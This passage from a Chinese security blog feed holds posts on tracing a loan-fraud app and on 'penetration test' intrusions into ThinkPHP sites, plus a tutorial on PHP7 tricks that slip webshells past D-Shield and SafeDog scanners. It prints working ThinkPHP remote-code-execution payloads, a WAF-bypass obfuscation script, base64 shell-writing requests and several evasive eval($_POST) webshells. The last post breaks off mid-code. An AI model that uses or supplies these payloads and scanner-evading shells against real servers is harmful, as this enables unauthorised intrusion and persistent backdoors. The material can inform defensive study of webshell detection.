      <category term="漏洞复现" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一次黑产溯源</title>
    <link href="http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/"/>
    <id>http://h3art3ars.github.io/2020/09/06/%E4%B8%80%E6%AC%A1%E9%BB%91%E4%BA%A7%E6%BA%AF%E6%BA%90/</id>
    <published>2020-09-06T13:33:29.000Z</published>
    <updated>2022-05-24T14:40:55.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记一次黑产溯源"><a href="#记一次黑产溯源" class="headerlink" title="记一次黑产溯源"></a>记一次黑产溯源</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>一个黑产仿冒客户的app，进行贷款诈骗，然后给我的任务就是尽可能的收集证据。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>客户给了一个app下载链接。</p><p><code>https://dbfgef.app*****.com/</code></p><p>查了一下ip位置，发现是新浪云服务器。</p><p>然后查看了一下下载页面，是一个仿冒应用宝下载页面。</p><p>仔细分析了一下页面，并且爆破了一下目录。</p><p>发现了 <code>/get.php</code>，发现了两个链接。</p><p><img src="/images/image-20200824204053339.png" alt="image-20200824204053339"></p><p>分别为andriod和ios应用。分别存储在其阿里云oss和一个应用分发平台。</p><p><img src="/images/image-20200824204217888.png" alt="image-20200824204217888"></p><p>应用分发脱离了平台，暂时放过。</p><p>分析一下app，下载app，进入app。</p><p><img src="/images/image-20200824204531686.png" alt="image-20200824204531686"></p><p>发现像是webview，抓了一个包，从web端访问，发现可以访问。之后就从web端开始测试了。</p><p>发现有头像上传，尝试文件上传。上传失败。查看url发现其上传的api是由另一台服务器处理的，于时访问此服务器直接发现了一个上传页面。</p><p><img src="/images/image-20200824205053058.png" alt="image-20200824205053058"></p><p>测试了一下，发现其上传后，还是传到阿里云oss，测试了一下，发现上传页面是使用thinkphp框架搭建，但是是5.0.24版本，无法利用。</p><p>继续查看web端，测试报错，发现其使用了thinkphp3.2.3框架开发。尝试访问日志成功。</p><p>在其中发现</p><p><img src="/images/image-20200824205613676.png" alt="image-20200824205613676"></p><p>cmd5解出密码账号密码 <code>1:[空格] [空格] [空格] [空格] [空格] [空格]</code></p><p>但是尝试了日志中的路径，均无法访问后台。猜测应该是前后台分离。</p><p>之后尝试了子域名，域名解析ip，以及同一ip下的域名访问，都没有查到相关信息。</p><p>之后再次尝试网站报错</p><p><img src="/images/image-20200824205838923.png" alt="image-20200824205838923"></p><p>发现其报错目录的域名，和web访问的域名不同。</p><p>尝试访问此域名。</p><p><img src="/images/image-20200824210144929.png" alt="image-20200824210144929"></p><p>是一个ios下载页面，测试了一下，没有什么功能，就提供了一个页面和下载链接。</p><p>之后再次尝试此域名的子域名，相关域名，同ip的域名。多番验证，找到这个页面。</p><p><img src="/images/image-20200824210920283.png" alt="image-20200824210920283"></p><p>直觉告诉我这是他们的后台。尝试上面得到的账号密码登录。成功登录。</p><p><img src="/images/image-20200824210608479.png" alt="image-20200824210608479"></p><p>看了一下信息，发现有之前在app注册的账号，再次证明为目标后台。之后后台尝试拿shell，未成功。</p><p>至此信息收集结束，打包交给客户。</p><p>然后过了一段时间，发现除了前台和后台，其他的站还好好的。</p><p><img src="/images/image-20200824210830301.png" alt="image-20200824210830301"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透测试的本质还是信息收集，收集的范围，和目标相关联的资产越多，测试下来能发现的漏洞就越多。还有就是违法的事情不能做，不然动了别人的利益，哪里都跑不掉。</p>]]></content>
    
    <summary type="html">
    
      溯源记录
    
    </summary>
    
    
      <category term="溯源" scheme="http://h3art3ars.github.io/categories/%E6%BA%AF%E6%BA%90/"/>
    
    
      <category term="信息收集" scheme="http://h3art3ars.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="溯源" scheme="http://h3art3ars.github.io/tags/%E6%BA%AF%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试纪实-tp过安全狗</title>
    <link href="http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/"/>
    <id>http://h3art3ars.github.io/2020/05/22/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-tp%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97/</id>
    <published>2020-05-22T13:45:12.000Z</published>
    <updated>2020-05-22T13:47:52.911Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前"><a href="#前" class="headerlink" title="前"></a>前</h1><p>拿到目标站后，看了看url，为 <code>signup.html</code>，加了个 <code>?s=captcha</code>,显示验证码，判断为tp框架。</p><p>果断拿起exp测试</p><p><img src="/images/image-20200522191303596.png" alt="image-20200522191303596"></p><p>很好，能成功，暗自窃喜一波。</p><p>之后看看phpinfo；</p><p><img src="/images/image-20200522191416443.png" alt="image-20200522191416443"></p><p>被拦截了</p><p>之后测试了一下404页面。</p><p><img src="/images/image-20200522191504255.png" alt="image-20200522191504255"></p><p>熟悉的拦路狗。</p><h1 id="中"><a href="#中" class="headerlink" title="中"></a>中</h1><p>猜测拦截了exp，但是很明显没有拦截包含日志的exp。</p><ul><li><p>试试包含日志。</p><p>将cookie设为 <code>&lt;?php phpinfo();?&gt;</code></p><p>结果被拦截，猜测拦截函数。</p></li><li><p>将cookie设为 <code>&lt;?php phpinfo/**/();?&gt;</code>,绕过了。php7.2版本。</p><p><img src="/images/image-20200522193950383.png" alt="image-20200522193950383"></p></li><li><p>之后测试一下写入</p><p><code>Cookie:file_put_contents/**/(&#39;./readme.txt&#39;,&#39;h3art3ars&#39;);</code></p><p><img src="/images/image-20200522195121019.png" alt="image-20200522195121019"></p><p>过滤了单引号，就知道没那么容易。</p></li><li><p>试一下不带payload的一句话 <code>&lt;? eval/**/(base64_decode($_POST[1]));?&gt;</code></p><p><code>post:_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/22.log&amp;1=cGhwaW5mbygpOw==</code></p><p>结果依旧被拦截。</p></li><li><p>测试了一下，是拦截了 $_POST[] 参数，那就继续绕过。将 <code>_POST</code> 参数，利用引用参数代替。</p><p>在本地 php shell 里面测试</p><p><img src="/images/image-20200522201052725.png" alt="image-20200522201052725"></p><p>可以看到在本地linux是测试成功的。</p></li><li><p>直接放到cookie里面看看：<code>Cookie:&lt;? $a=chr/**/(95).chr/**/(80).chr/**/(79).chr/**/(83).chr/**/(84);eval/**/(base64_decode/**/($/**/{$a}[1]));?&gt;</code></p><p><img src="/images/image-20200522201322865.png" alt="image-20200522201322865"></p><p>对方系统windows，出错了。不知道是为什么。</p></li><li><p>那就只能换一个思路，直接将要执行的命令用chr函数表示。</p><p>由于一个一个chr太麻烦，索性写了个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import base64</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &#39;phpinfo()&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; base64.b64encode(cmd.encode(&#39;utf-8&#39;))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">strs &#x3D; bytes.decode(strs)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for c in strs:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    a +&#x3D; &quot;chr&#x2F;**&#x2F;(&quot; + str(ord(c))+&#39;).&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">a &#x3D; a[0:-1]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">a &#x3D; &#39;&lt;? $a&#x3D;&#39;+a + &#39;;eval&#x2F;**&#x2F;(base64_decode&#x2F;**&#x2F;($a));?&gt;&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">print(a)</span></pre></td></tr></table></figure><p><img src="/images/image-20200522203613777.png" alt="image-20200522203613777"></p></li><li><p>把payload复制到cookie中试试,成功。</p><p><img src="/images/image-20200522203503512.png" alt="image-20200522203503512"></p></li><li><p>接下来写入一句话，然而却是访问404.</p></li><li><p>猜测是狗吃了一句话，那就从上次写的 <code>php新特性过马</code>文章中拿一个试试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$b&#x3D;&quot;_POST&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[$&#123;$b&#125;[&#39;a&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[$c]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($c);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/image-20200522210021466.png" alt="image-20200522210021466"></p><p>执行，测试一下。</p><p><img src="/images/image-20200522210102083.png" alt="image-20200522210102083"></p><p>成功。</p></li></ul><h1 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h1><p>windows提权，未成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Windows NT WIN-RU4FAFHHEMH 6.1 build 7601 (Windows Server 2008 R2 Enterprise Edition Service Pack 1) AMD64</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      渗透测试记录
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试纪实-1</title>
    <link href="http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/"/>
    <id>http://h3art3ars.github.io/2020/05/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%AA%E5%AE%9E-1/</id>
    <published>2020-05-21T07:59:36.000Z</published>
    <updated>2020-05-21T08:03:58.425Z</updated>
    
    <content type="html"><![CDATA[<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p>找到目标站，大略浏览了一遍</p><p>看了一下url <code>app/dist/index.html#/reg?phone=</code>有点像thinkphp框架，</p><p>试了试 <code>domain/captcha</code>显示404</p><p>之后看了看chrome network抓的包</p><p><img src="/images/image-20200521145023239.png" alt="image-20200521145023239"></p><p>看样子是改了默认的入口文件 <code>index.php</code></p><p>之后又试了下 <code>tl_api.php?s=captcha</code></p><p><img src="/images/image-20200521145919691.png" alt="image-20200521145919691"></p><p>熟悉的界面。</p><p>直接上exp，然后，所有的报错页面都显示这个。</p><p><img src="/images/image-20200521150108485.png" alt="image-20200521150108485"></p><p>心里顿时暗道不妙，还记得上次也是tp的站 ，对方加了cloudflare，然后动不动禁ip，一上exp就禁ip，弄得我束手无测，不过这次报错界面却暴露了他的真实ip。SERVER_ADDR对应的值就是真实ip。</p><p>之后直接从真实ip入手</p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>试了试日志和session包含，</p><p><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=../runtime/log/202005/19.log</code></p><p>但是都失败了</p><p>说不定版本小于7.1.索性直接assert</p><p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=phpinfo();</code></p><p>成功了，是php5.6版本的。</p><p>之后就是写入shell了。</p><p><code>_method=__construct&amp;method=get&amp;filter[]=assert&amp;get[]=file_put_contents(&#39;./readme.php&#39;,base64_decode(&#39;PD9waHAgCiAgICAkYiA9IHN1YnN0cigkX1BPU1RbJ2gzYXJ0M2FycyddLCAxKTsKICAgIGV2YWwoYmFzZTY0X2RlY29kZSgkYikpOwo/Pg==&#39;));</code></p><p>然后报了出乎意料的错误，语法错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Parse error: syntax error, unexpected &#39;&#39;.&#x2F;readme.php\&#39;,base64_decode&#39; (T_ENCAPSED_AND_WHITESPACE), expecting identifier (T_STRING) in assert code on line 1</span></pre></td></tr></table></figure><p>是过滤了单引号了。</p><h2 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h2><p>assert调用assert</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;assert&amp;get[]&#x3D;assert(base64_decode($_POST[1]));&amp;1&#x3D;ZmlsZV9wdXRfY29udGVudHMoJy4vcmVhZG1lLnBocCcsYmFzZTY0X2RlY29kZSgnUEQ5d2FIQWdDaUFnSUNBa1lpQTlJSE4xWW5OMGNpZ2tYMUJQVTFSYkoyZ3pZWEowTTJGeWN5ZGRMQ0F4S1RzS0lDQWdJR1YyWVd3b1ltRnpaVFkwWDJSbFkyOWtaU2drWWlrcE93by9QZz09Jykp</span></pre></td></tr></table></figure><p>最终写入了shell。</p><p><img src="/images/image-20200521152159765.png" alt="image-20200521152159765"></p><p>提权未成功，bypass disable未成功</p><p><code>Linux guest 3.10.0-1127.el7.x86_64 #1 SMP Tue Mar 31 23:36:51 UTC 2020 x86_64</code></p>]]></content>
    
    <summary type="html">
    
      实际渗透测试记录
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实战" scheme="http://h3art3ars.github.io/tags/%E5%AE%9E%E6%88%98/"/>
    
      <category term="渗透测试" scheme="http://h3art3ars.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>利用php新特性过静态查杀</title>
    <link href="http://h3art3ars.github.io/2020/02/27/%E5%88%A9%E7%94%A8php%E6%96%B0%E7%89%B9%E6%80%A7%E8%BF%87%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80/"/>
    <id>http://h3art3ars.github.io/2020/02/27/%E5%88%A9%E7%94%A8php%E6%96%B0%E7%89%B9%E6%80%A7%E8%BF%87%E9%9D%99%E6%80%81%E6%9F%A5%E6%9D%80/</id>
    <published>2020-02-27T06:15:21.000Z</published>
    <updated>2020-02-27T06:19:03.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在研究webshell免杀，抽出心得的一个新颖的点。原因是突然想到既然php7.1不能利用可变函数的assert，那就利用php7的新特性来绕过查杀正则，最终绕过某盾和“某d0g”。</p><p>实验环境在7.1.9，所有马儿在php7以下的环境均不能使用。</p><p>D盾规则库（最新）：20191227</p><p>某d0g因为可能会因为用其产品测试，导致侵权行为，为了防止被举报所以就不放图了。</p><h1 id="前置实验"><a href="#前置实验" class="headerlink" title="前置实验"></a>前置实验</h1><h2 id="某盾"><a href="#某盾" class="headerlink" title="某盾"></a>某盾</h2><p>首先以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&#39;aaaa&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">eval($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-1.png" alt=""></p><p>直接误报了。</p><p>因此，直接传参到eval里面是不现实的。</p><p>所以接下来我们要利用函数，配合php新特性来绕过它。</p><h2 id="某d0g"><a href="#某d0g" class="headerlink" title="某d0g"></a>某d0g</h2><p>而对于某d0g，只要以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$_POST[&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">eval($b)</span></pre></td></tr></table></figure><p>就会让其误报。</p><p>因此在写免杀马的时候，post中的变量，不要出现在eval中的字符串中。就像上面<code>b</code>一样，尽管他在<code>eval</code>中是以变量的形式出现的。</p><p>有了这个基础就可以进入正题了</p><h1 id="PHP7-0-x"><a href="#PHP7-0-x" class="headerlink" title="PHP7.0.x"></a>PHP7.0.x</h1><p><a href="https://www.php.net/manual/zh/migration70.new-features.php" target="_blank" rel="noopener">php手册-php7.0.x新特性</a></p><h2 id="返回值类型声明"><a href="#返回值类型声明" class="headerlink" title="返回值类型声明"></a>返回值类型声明</h2><p>php7增加了返回值类型声明的支持，在定义函数时增加一个 <code>：类型</code>便可以了。</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">function a():int&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">...</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>就是函数返回值类型要为int。否则会强制转换或者显示语法错误。</p><p>如果未更新此特性的查杀软件，就会不认识此函数，导致被绕过。</p><p>例如:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function b():string&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">return $_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval(b());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>可以用查杀软件测试一下。</p><p><img src="/images/webshell-2.png" alt="webshell-0221114935875"></p><p>发现没有被检测到。</p><p><img src="/images/webshell-3.png" alt=""></p><p>可以使用。</p><h2 id="null合并运算符"><a href="#null合并运算符" class="headerlink" title="null合并运算符"></a>null合并运算符</h2><p> 由于日常使用中存在大量同时使用三元表达式和 <code>isset()</code>的情况， 添加了null合并运算符 (<em>??</em>) 这个语法糖。如果变量存在且值不为<strong><code>NULL</code></strong>， 它就会返回自身的值，否则返回它的第二个操作数 </p><p>简单来说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;isset($_POST[&#39;a&#39;])?$_POST[&#39;a&#39;]:&#39;h3art3ars&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&lt;&#x3D;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$_POST[&#39;a&#39;]??&#39;h3art3ars&#39;;</span></pre></td></tr></table></figure><p>如果运用 <code>？？</code>符号，查杀软件不会理解着个处理过程 ，可能就会导致绕过。</p><p>就像以下代码就可以绕过某d0g</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$b??$_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">eval($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>再利用函数调用一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;$b??$_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">return $a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-4.png" alt="webshell-0221135305463"></p><p>可以发现已经过了D盾</p><p>测试一下可用性</p><p><img src="/images/webshell-5.png" alt="webshell-0221135427992"></p><p>接下来看看7.1的特性吧</p><h1 id="php7-1-x"><a href="#php7-1-x" class="headerlink" title="php7.1.x"></a>php7.1.x</h1><p><a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">php手册-php7.0.x新特性</a></p><h2 id="可为空（Nullable）类型"><a href="#可为空（Nullable）类型" class="headerlink" title="可为空（Nullable）类型"></a>可为空（Nullable）类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">参数以及返回值的类型现在可以通过在类型前加上一个问号使之允许为空。 当启用这个特性时，传入的参数或者函数返回的结果要么是给定的类型，要么是 null 。</span></pre></td></tr></table></figure><p>比7.1的特性多了个 <code>？</code>函数返回值若不是给定类型，则为空。</p><p>使用同样的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a(): ?string</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    return $_POST[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> ?&gt;</span></pre></td></tr></table></figure><p>不出意外</p><p><img src="/images/webshell-6.png" alt="webshell-0219204958964"></p><p>过了D盾</p><h2 id="短数组语法"><a href="#短数组语法" class="headerlink" title="短数组语法"></a>短数组语法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">短数组语法（[]）现在作为list()语法的一个备选项，可以用于将数组的值赋给一些变量（包括在foreach中）。</span></pre></td></tr></table></figure><p>这里选用中括号 <code>[]类型</code>的列表来演示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;a&#39;,&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr></table></figure><p>这样，就把数组的值分别赋给了<code>$c</code>,<code>$d</code>.<code>$c=&#39;a&#39;;$d=&#39;b&#39;;</code></p><p>这样，就可以用这个少用的特性，来绕过静态查杀</p><p>首先写一个最简单的:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;h3art3ars&#39;,$_POST[&#39;h3art3ars&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">eval($d);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>然后就过了某d0g。自行测试。</p><p>之后就可以配合函数。就像这样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[&#39;h3art3ars&#39;,$_POST[&#39;h3art3ars&#39;]];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">[$c,$d]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">return $d;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>查杀一下</p><p><img src="/images/webshell-7.png" alt="webshell-0221142921253"></p><p>测试可用性</p><p><img src="/images/webshell-8.png" alt="webshell-0221143047426"></p><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list()现在支持键名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">官方说明：现在list()和它的新的[]语法支持在它内部去指定键名。这意味着它可以将任意类型的数组 都赋值给一些变量（与短数组语法类似）</span></pre></td></tr></table></figure><p>这个很绕，看一下例子也许就会明白了。</p><p>eg:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"> $data &#x3D; [&quot;id&quot; &#x3D;&gt; 1, &quot;name&quot; &#x3D;&gt; &#39;h3art3ars&#39;]; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">[&quot;id&quot; &#x3D;&gt; $a, &quot;name&quot; &#x3D;&gt; $b] &#x3D; $data;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;结果$a&#x3D;1,$b&#x3D;&#39;h3art3ars&#39;</span></pre></td></tr></table></figure><p>稍微改改就能过某d0g(自行测试)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&quot;shell&quot;&#x3D;&gt;&#39;a&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&quot;c&quot;&#x3D;&gt;$_POST[&#39;h3art3ars&#39;],</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">[&quot;shell&quot;&#x3D;&gt;$c,&quot;c&quot;&#x3D;&gt;$b]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">eval($b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>试试D盾</p><p><img src="/images/webshell-9.png" alt="webshell-0219205502645"></p><p>报了一级</p><p>再次借助自定义函数。</p><figure class="highlight 